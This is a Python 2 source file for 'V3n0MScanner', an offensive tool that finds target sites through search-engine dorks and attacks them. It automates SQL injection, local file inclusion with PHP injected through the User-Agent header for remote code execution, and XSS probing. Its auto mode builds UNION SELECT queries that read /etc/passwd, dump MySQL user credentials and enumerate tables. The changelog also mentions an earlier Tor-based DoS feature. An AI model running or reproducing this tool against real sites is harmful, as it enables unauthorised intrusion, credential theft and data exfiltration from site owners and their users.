#!/usr/bin/python
# -*- coding: latin-1 -*-
#              --- To be Done     --Partially implemented     -Done
# V3n0MScanner.py - V.3.2.1 Beta
#   -Fix engines search parameters
#   ---Increase LFI/RFI/XSS Lists if possible
#   ---Implement SQL Database dumping tweaks
#   ---Implement SQLi Post Method attack
#   - Removed ToRSledgehammer attack. Only skids DoS
#   --Update Banner
#   --Generalised "Tweaks" required
#	---Build and Implement Admin page finder
#	---Commenting
#	---Improve Md5 check to not use Static method
#	---Prepare code for Hash cracking feature
#   ---Live logging
#	--Prepare coding for Admin page finder
#   ---Pause Scanning option
#   ---Add MD5 and SHA1 Detection/Cracking
#	---Remove "Dark" naming conventions, provide more accurate names
#
# V3n0MScanner.py - V.3.0.2
#    -Increased headers list to include mobile devices headers 
#    -Increased XSS Detection by almost double, Detects Actual Bypass required for the attack to progress
#    -Increased LFI Detection rates 
#    -Increased URL Detection rate for valid Vuln sites
#    -New Banner Style promoting V3n0M Scanner and Version details
#    -New method for identifying Version make: V.x.y.z Where x is the main release version, y is amount of Beta release
#     versions and z is the
#     amount of alpha release versions. ie, V.3.0.2 is Main release build 3 that has had 0 Beta test phases and 2 Alpha
#     release phases
#    -New Search Engine's powering the scanner so should give alot more results.
#    -Intergrated DoS Feature, now you can select to [1] Scan as you used to for vulnerabilitys or [2] TorSledgehammer
#     DoS Attack
#    -New MultiPlatform version instead of the old Linux/Windows seperate releases
#    -TorSledgehammer DoS tool rotates attacks through multiple detected Internet connections to spread attack workload
#     and increase DoS success rate.
#
#
# V3n0MScanner.py - a modified smartd0rk3r
#    - added superlarge Dork list
#    - added new headers
#    - added lots of new XSS detectors and XSS Filter Bypass Detection to for spotting those trickier XSS sites
#    - added mbcs encoding support and linux mbcs encoding bypass to make the program multi-platform again
#
#
#                       This program has been based upon the smartd0rk3r and darkd0rker
#                       It has been heavily edited, updated and improved upon by Novacygni
#                       but in no way is this the sole work of NovaCygni, and credit is due
#                       to every person who has worked on this tool. Thanks people. NovaCygni




import re
import time
import sys
import random
import math
import threading
import socket
import urllib2
import cookielib
import subprocess
import codecs

#import statics 
import urllib
import urlparse
import itertools
import Queue
import statics

#Multithreading implementation and queueing prepared and ready, Debug support required for stability and testing
#if __debug__:  
#   import threading as parcomp  
#   queueclass=Queue.Queue  
#   workerclass=threading.Thread  
#   NUMWORKERS=1  
#else:  
#   import multiprocessing as parcomp  
#   queueclass=parcomp.Queue  
#   workerclass=parcomp.Process  
#   NUMWORKERS=parcomp.cpu_count()  




#This is the MBCS Encoding Bypass for making MBCS encodings work on Linux - NovaCygni
try:
	codecs.lookup('mbcs')
except LookupError:
	ascii = codecs.lookup('latin-1')
	func = lambda name, enc=ascii: {True: enc}.get(name == 'mbcs')
	codecs.register(func)




# Colours
W = "\033[0m"
R = "\033[31m"
G = "\033[32m"
O = "\033[33m"
B = "\033[34m"





# Banner
def logo():
	print R + "\n|----------------------------------------------------------------|"
	print "|                  V3n0M-Scanner.py   - By NovaCygni             |"
	print "|     Release Date 23/10/2013  - Release Version V.3.2.1         |"
	print "|          THIS IS A PRERELEASE BETA  TEST VERSION               |"
	print "|                         NovaCygni                              |"
	print "|                                                                |"
	print "|                                                                |"
	print "|                                                                |"
	print "|                                                                |"
	print "|                                                                |"
	print "|                    _____       _____                           |"
	print "|                   |____ |     |  _  |                          |"
	print "|             __   __   / /_ __ | |/' |_ __ ___                  |"
	print "|             \ \ / /   \ \ '_ \|  /| | '_ ` _ \                 |"
	print "|              \ V /.___/ / | | \ |_/ / | | | | |                |"
	print "|    Official   \_/ \____/|_| |_|\___/|_| |_| |_|  Release       |"
	print "|   Note: PLEASE RUN TOR ON PORT 9050 TO USE TOR FEATURES        |"
	print "|----------------------------------------------------------------|\n"


if sys.platform == 'linux' or sys.platform == 'linux2':
	subprocess.call("clear", shell=True)
	logo()


else:
	subprocess.call("cls", shell=True)
	logo()

log = "v3n0m-sqli.txt"
logfile = open(log, "a")
lfi_log = "v3n0m-lfi.txt"
lfi_log_file = open(lfi_log, "a")
rce_log = "v3n0m-rce.txt"
rce_log_file = open(rce_log, "a")
xss_log = "v3n0m-xss.txt"
xss_log_file = open(xss_log, "a")
admin_log = "v3n0m-admin.txt"
admin_log_file = open(admin_log, "a")

arg_end = "--"
arg_eva = "+"
colMax = 60 # Change this at your will
gets = 0
file = "/etc/passwd"
threads = []
darkurl = []
vuln = []
col = []
timeout = 75
socket.setdefaulttimeout(timeout)

def search(maxc):
	urls = []
	urls_len_last = 0
	for site in sitearray:
		dark = 0
		for dork in go:
			dark += 1
			page = 0
			try:
				while page < int(maxc):
					try:
						jar = cookielib.FileCookieJar("cookies")
						query = dork + "+site:" + site
						results_web = 'http://www.galaxy.com/search/gsite?cx=partner-pub-7997125561256657%3Aihfdd571hqo&cof=FORID%3A10&ie=UTF-8&q=' + query + 'hl=en&page=' + repr(
							page) + '&src=hmp' and 'http://www.search-results.com/web?o=&tpr=1&q=' + query + '&hl=en&page=' + repr(
							page) + '&src=hmp' and 'http://blekko.com/#?q=' + query + '&hl=en&page=' + repr(
							page) + '&src=hmp' and 'http://search.lycos.com/web?q=' + query + '&hl=en&page=' + repr(
							page) + '&src=hmp' and 'http://www.webcrawler.com/search/web?fcoid=421&fcop=topnav&fpid=27&aid=ab8d8d87-cd66-4573-898b-e2585c92c0ba&ridx=1&q=' + query + '&hl=en&page=' + repr(
							page) + '&src=hmp' and 'http://msxml.excite.com/search/web?q=' + query + '&hl=en&page=' + repr(
							page) + '&src=hmp' and 'https://duckduckgo.com/?q=' + query + '&hl=en&page=' + repr(
							page) + '&src=hmp' and 'https://www.gigablast.com/search?k8c=17319&q=' + query + '&hl=en&page=' + repr(
							page) + '&src=hmp' and 'http://www.gibiru.com/?cx=partner-pub-5956360965567042%3A8627692578&cof=FORID%3A11&ie=UTF-8&q=' + query + '&hl=en&page=' + repr(
							page) + '&src=hmp' and 'http://www.dogpile.com/info.dogpl.t10.5/search/web?fcoid=417&fcop=topnav&fpid=27&q=' + query + '&hl=en&page=' + repr(
							page) + '&src=hmp' and 'http://www.bing.com/search?q=' + query + '&hl=en&page=' + repr(
							page) + '&src=hmp'
						request_web = urllib2.Request(results_web)
						agent = random.choice(header)
						request_web.add_header('User-Agent', agent)
						opener_web = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
						text = opener_web.open(request_web).read()
						stringreg = re.compile('(?<=href=")(.*?)(?=")')
						names = stringreg.findall(text)
						page += 1
						for name in names:
							if name not in urls:
								if re.search(r'\(', name) or re.search("<", name) or re.search("\A/",
								                                                               name) or re.search(
										"\A(http://)\d", name):
									pass
								elif re.search("google", name) or re.search("youtube", name) or re.search("phpbuddy",
								                                                                          name) or re.search(
										"iranhack", name) or re.search("phpbuilder", name) or re.search("codingforums",
								                                                                        name) or re.search(
										"phpfreaks", name) or re.search("%", name) or re.search("facebook",
								                                                                name) or re.search(
										"twitter", name) or re.search("hackforums", name) or re.search("askjeeves",
								                                                                       name) or re.search(
										"wordpress", name) or re.search("github", name):
									pass
								elif re.search(site, name):
									urls.append(name)
						darklen = len(go)
						percent = int((1.0 * dark / int(darklen)) * 100)
						urls_len = len(urls)
						sys.stdout.write(
							"\rSite: %s | Collected urls: %s | D0rks: %s/%s | Percent Done: %s | Current page no.: %s <> " % (
							site, repr(urls_len), dark, darklen, repr(percent), repr(page)))
						sys.stdout.flush()
						if urls_len == urls_len_last:
							page = int(maxc)
						urls_len_last = len(urls)

					except:
						pass
			except KeyboardInterrupt:
				pass
		tmplist = []
		print "\n\n[+] URLS (unsorted): ", len(urls)
		for url in urls:
			try:
				host = url.split("/", 3)
				domain = host[2]
				if domain not in tmplist and "=" in url:
					finallist.append(url)
					tmplist.append(domain)

			except:
				pass
		print "[+] URLS (sorted)  : ", len(finallist)
		return finallist




class injThread(threading.Thread):
	def __init__(self, hosts):
		self.hosts = hosts
		self.fcount = 0
		self.check = True
		threading.Thread.__init__(self)

	def run(self):
		urls = list(self.hosts)
		for url in urls:
			try:
				if self.check:
					ClassicINJ(url)
				else:
					break
			except(KeyboardInterrupt, ValueError):
				pass
		self.fcount += 1

	def stop(self):
		self.check = False


class lfiThread(threading.Thread):
	def __init__(self, hosts):
		self.hosts = hosts
		self.fcount = 0
		self.check = True
		threading.Thread.__init__(self)

	def run(self):
		urls = list(self.hosts)
		for url in urls:
			try:
				if self.check:
					ClassicLFI(url)
				else:
					break
			except(KeyboardInterrupt, ValueError):
				pass
		self.fcount += 1

	def stop(self):
		self.check = False


class xssThread(threading.Thread):
	def __init__(self, hosts):
		self.hosts = hosts
		self.fcount = 0
		self.check = True
		threading.Thread.__init__(self)

	def run(self):
		urls = list(self.hosts)
		for url in urls:
			try:
				if self.check:
					ClassicXSS(url)
				else:
					break
			except(KeyboardInterrupt, ValueError):
				pass
		self.fcount += 1

	def stop(self):
		self.check = False


def ClassicINJ(url):
	EXT = "'"
	host = url + EXT
	try:
		source = urllib2.urlopen(host).read()
		for type, eMSG in sqlerrors.items():
			if re.search(eMSG, source):
				print R + "[!] w00t!,w00t!:", O + host, B + "Error:", type, R + " ---> SQL Injection Found"
				logfile.write("\n" + host)
				vuln.append(host)
				col.append(host)
				break


			else:
				pass
	except:
		pass


def ClassicLFI(url):
	lfiurl = url.rsplit('=', 1)[0]
	if lfiurl[-1] != "=":
		lfiurl = lfiurl + "="
	for lfi in lfis:
		try:
			check = urllib2.urlopen(lfiurl + lfi.replace("\n", "")).read()
			if re.findall("root:x", check):
				print R + "[!] w00t!,w00t!: ", O + lfiurl + lfi, R + " ---> Local File Include Found"
				lfi_log_file.write("\n" + lfiurl + lfi)
				vuln.append(lfiurl + lfi)
				target = lfiurl + lfi
				target = target.replace("/etc/passwd", "/proc/self/environ", "/etc/passwd%00")
				header = "<? echo md5(NovaCygni); ?>"
				try:
					request_web = urllib2.Request(target)
					request_web.add_header('User-Agent', header)
					text = urllib2.urlopen(request_web)
					text = text.read()
					if re.findall("7ca328e93601c940f87d01df2bbd1972", text):
						print R + "[!] w00t!,w00t!: ", O + target, R + " ---> LFI to RCE Found"
						rce_log_file.write("\n", target)
						vuln.append(target)
				except:
					pass

		except:
			pass


def ClassicXSS(url):
	for xss in xsses:
		try:
			source = urllib2.urlopen(url + xss.replace("\n", "")).read()
			if re.findall("XSS Vuln FromCharCode filter bypass detected", source) or re.findall(
					"Basic XSS Vuln Detected", source) or re.findall("Case Sensitive XSS Vector", source) or re.findall(
					"Malformed A Tag Attack Vuln", source) or re.findall("UTF8 Unicode XSS Vuln Detected",
			                                                             source) or re.findall(
					"XSS BodyTag Vuln Detected", source) or re.findall("US-ASCII XSS Bypass Vuln Detected",
			                                                           source) or re.findall(
					"XSS Embedded Tab Vulnerability", source) or re.findall("XSS Hex Vulnerability",
			                                                                source) or re.findall(
					"XSS Embedded Encoded Tab Vulnerability", source) or re.findall(
					"XSS Extraneous Open Brackets Vulnerability", source) or re.findall("XSS Base 64 Encoding Bypass",
			                                                                            source) or re.findall(
					"XSS Javascript Escapes Vulnerability Detected", source) or re.findall(
					"XSS End Title Tag Vulnerability Detected", source) or re.findall(
					"XSS Style Tags with Broken Javascript Vulnerability Detected", source) or re.findall("<OY1Py", source) or re.findall(
					"<LOY2PyTRurb1c", source):
				print R + "[!] w00t!,w00t!: ", O + url + xss, R + " ---> XSS Found (manual verification required)"
				xss_log_file.write("\n" + url + xss)
				vuln.append(url + xss)
		except:
			pass


def injtest():
	print B + "\n[+] Preparing for SQLi scanning ..."
	print "[+] Can take a while ..."
	print "[!] Working ...\n"
	i = len(usearch) / int(numthreads)
	m = len(usearch) % int(numthreads)
	z = 0
	if len(threads) <= numthreads:
		for x in range(0, int(numthreads)):
			sliced = usearch[x * i:(x + 1) * i]
			if z < m:
				sliced.append(usearch[int(numthreads) * i + z])
				z += 1
			thread = injThread(sliced)
			thread.start()
			threads.append(thread)
		for thread in threads:
			thread.join()


def lfitest():
	print B + "\n[+] Preparing for LFI - RCE scanning ..."
	print "[+] Can take a while ..."
	print "[!] Working ...\n"
	i = len(usearch) / int(numthreads)
	m = len(usearch) % int(numthreads)
	z = 0
	if len(threads) <= numthreads:
		for x in range(0, int(numthreads)):
			sliced = usearch[x * i:(x + 1) * i]
			if z < m:
				sliced.append(usearch[int(numthreads) * i + z])
				z += 1
			thread = lfiThread(sliced)
			thread.start()
			threads.append(thread)
		for thread in threads:
			thread.join()


def xsstest():
	print B + "\n[+] Preparing for XSS scanning ..."
	print "[+] Can take a while ..."
	print "[!] Working ...\n"
	i = len(usearch) / int(numthreads)
	m = len(usearch) % int(numthreads)
	z = 0
	if len(threads) <= numthreads:
		for x in range(0, int(numthreads)):
			sliced = usearch[x * i:(x + 1) * i]
			if z < m:
				sliced.append(usearch[int(numthreads) * i + z])
				z += 1
			thread = xssThread(sliced)
			thread.start()
			threads.append(thread)
		for thread in threads:
			thread.join()




Scanner = 1
menu = True
while True:
	if Scanner == 1:
		threads = []
		finallist = []
		vuln = []
		col = []
		darkurl = []

		print W
		sites = raw_input("\nChoose your target(domain)   : ")
		sitearray = [sites]

		go = []

		dorks = raw_input("Choose the number of random dorks (0 for all.. may take awhile!)   : ");
		print ""
		if int(dorks) == 0:
			i = 0
			while i < len(d0rk):
				go.append(d0rk[i])
				i += 1
		else:
			i = 0
			while i < int(dorks):
				go.append(choice(d0rk))
				i += 1
			for g in go:
				print "dork: ", g

		numthreads = raw_input('\nEnter no. of threads : ')
		maxc = raw_input('Enter no. of pages   : ')
		print "\nNumber of SQL errors :", len(sqlerrors)
		print "Number of LFI paths  :", len(lfis)
		print "Number of XSS cheats :", len(xsses)
		print "Number of headers    :", len(header)
		print "Number of threads    :", numthreads
		print "Number of dorks      :", len(go)
		print "Number of pages      :", maxc
		print "Timeout in seconds   :", timeout
		print "Utilised Engines     : 11 >-< Encrypted Engines = 3 "
		print ""
		print ""
		print ""

		usearch = search(maxc)
		Scanner = 0

	print R + "\n[1] SQLi Testing"
	print "[2] SQLi Testing Auto Mode"
	print "[3] LFI - RCE Testing"
	print "[4] XSS Testing"
	print "[5] SQLi and LFI - RCE Testing"
	print "[6] SQLi and XSS Testing"
	print "[7] LFI -RCE and XSS Testing"
	print "[8] SQLi,LFI - RCE and XSS Testing"
	print "[9] Save valid urls to file"
	print "[10] Print valid urls"
	print "[11] Found vuln in last scan"
	print "[12] New scan"
	print "[0] Exit\n"
	chce = raw_input(":")
	if chce == '1':
		injtest()

	if chce == '2':
		injtest()
		print B + "\n[+] Preparing for Column Finder ..."
		print "[+] Can take a while ..."
		print "[!] Working ..."
		# Thanks rsauron for schemafuzz
		for host in col:
			print R + "\n[+] Target: ", O + host
			print R + "[+] Attempting to find the number of columns ..."
			print "[+] Testing: ",
			checkfor = []
			host = host.rsplit("'", 1)[0]
			sitenew = host + arg_eva + "and" + arg_eva + "1=2" + arg_eva + "union" + arg_eva + "all" + arg_eva + "select" + arg_eva
			makepretty = ""
			for x in xrange(0, colMax):
				try:
					sys.stdout.write("%s," % x)
					sys.stdout.flush()
					darkc0de = "dark" + str(x) + "c0de"
					checkfor.append(darkc0de)
					if x > 0:
						sitenew += ","
					sitenew += "0x" + darkc0de.encode("hex")
					finalurl = sitenew + arg_end
					gets += 1
					source = urllib2.urlopen(finalurl).read()
					for y in checkfor:
						colFound = re.findall(y, source)
						if len(colFound) >= 1:
							print "\n[+] Column length is:", len(checkfor)
							nullcol = re.findall("\d+", y)
							print "[+] Found null column at column #:", nullcol[0]
							for z in xrange(0, len(checkfor)):
								if z > 0:
									makepretty += ","
								makepretty += str(z)
							site = host + arg_eva + "and" + arg_eva + "1=2" + arg_eva + "union" + arg_eva + "all" + arg_eva + "select" + arg_eva + makepretty
							print "[+] SQLi URL:", site + arg_end
							site = site.replace("," + nullcol[0] + ",", ",darkc0de,")
							site = site.replace(arg_eva + nullcol[0] + ",", arg_eva + "darkc0de,")
							site = site.replace("," + nullcol[0], ",darkc0de")
							print "[+] darkc0de URL:", site
							darkurl.append(site)

							print "[-] Done!\n"
							break

				except(KeyboardInterrupt, SystemExit):
					raise
				except:
					pass

			print "\n[!] Sorry column length could not be found\n"
			###########

		print B + "\n[+] Gathering MySQL Server Configuration..."
		for site in darkurl:
			head_URL = site.replace("evilzone",
			                        "concat(0x1e,0x1e,version(),0x1e,user(),0x1e,database(),0x1e,0x20)") + arg_end
			print R + "\n[+] Target:", O + site
			while 1:
				try:
					gets += 1
					source = urllib2.urlopen(head_URL).read()
					match = re.findall("\x1e\x1e\S+", source)
					if len(match) >= 1:
						match = match[0][2:].split("\x1e")
						version = match[0]
						user = match[1]
						database = match[2]
						print W + "\n\tDatabase:", database
						print "\tUser:", user
						print "\tVersion:", version
						version = version[0]

						load = site.replace("evilzone", "load_file(0x2f6574632f706173737764)")
						source = urllib2.urlopen(load).read()
						if re.findall("root:x", source):
							load = site.replace("evilzone", "concat_ws(char(58),load_file(0x" + file.encode(
								"hex") + "),0x62616c74617a6172)")
							source = urllib2.urlopen(load).read()
							search = re.findall("NovaCygni", source)
							if len(search) > 0:
								print "\n[!] w00t!w00t!: " + site.replace("evilzone",
								                                          "load_file(0x" + file.encode("hex") + ")")

							load = site.replace("evilzone",
							                    "concat_ws(char(58),user,password,0x62616c74617a6172)") + arg_eva + "from" + arg_eva + "mysql.user"
						source = urllib2.urlopen(load).read()
						if re.findall("NovaCygni", source):
							print "\n[!] w00t!w00t!: " + site.replace("evilzone",
							                                          "concat_ws(char(58),user,password)") + arg_eva + "from" + arg_eva + "mysql.user"

					print W + "\n[+] Number of tables:", len(tables)
					print "[+] Number of columns:", len(columns)
					print "[+] Checking for tables and columns..."
					target = site.replace("evilzone", "0x62616c74617a6172") + arg_eva + "from" + arg_eva + "T"
					for table in tables:
						try:
							target_table = target.replace("T", table)
							source = urllib2.urlopen(target_table).read()
							search = re.findall("NovaCygni", source)
							if len(search) > 0:
								print "\n[!] w00t!w00t! Found a table called: < " + table + " >"
								print "\n[+] Lets check for columns inside table < " + table + " >"
								for column in columns:
									try:
										source = urllib2.urlopen(target_table.replace("0x62616c74617a6172",
										                                              "concat_ws(char(58),0x62616c74617a6172," + column + ")")).read()
										search = re.findall("NovaCygni", source)
										if len(search) > 0:
											print "\t[!] w00t!w00t! Found a column called: < " + column + " >"
									except(KeyboardInterrupt, SystemExit):
										raise
									except(urllib2.URLError, socket.gaierror, socket.error, socket.timeout):
										pass

								print "\n[-] Done searching inside table < " + table + " > for columns!"

						except(KeyboardInterrupt, SystemExit):
							raise
						except(urllib2.URLError, socket.gaierror, socket.error, socket.timeout):
							pass
					print "[!] Fuzzing is finished!"
					break
				except(KeyboardInterrupt, SystemExit):
					raise

	if chce == '3':
		lfitest()

	if chce == '4':
		xsstest()

	if chce == '5':
		injtest()
		lfitest()

	if chce == '6':
		injtest()
		xsstest()

	if chce == '7':
		lfitest()
		xsstest()

	if chce == '8':
		injtest()
		lfitest()
		xsstest()

	if chce == '9':
		print B + "\nSaving valid urls (" + str(len(finallist)) + ") to file"
		listname = raw_input("Filename: ")
		list_name = open(listname, "w")
		finallist.sort()
		for t in finallist:
			list_name.write(t + "\n")
		list_name.close()
		print "Urls saved, please check", listname

	if chce == '10':
		print W + "\nPrinting valid urls:\n"
		finallist.sort()
		for t in finallist:
			print B + t

	if chce == '11':
		print B + "\nVuln found ", len(vuln)

	if chce == '12':
		Scanner = 1
		print W + ""

	if chce == '0':
		print R + "\n Exiting ..."
		mnu = False
		print W
		sys.exit(0)
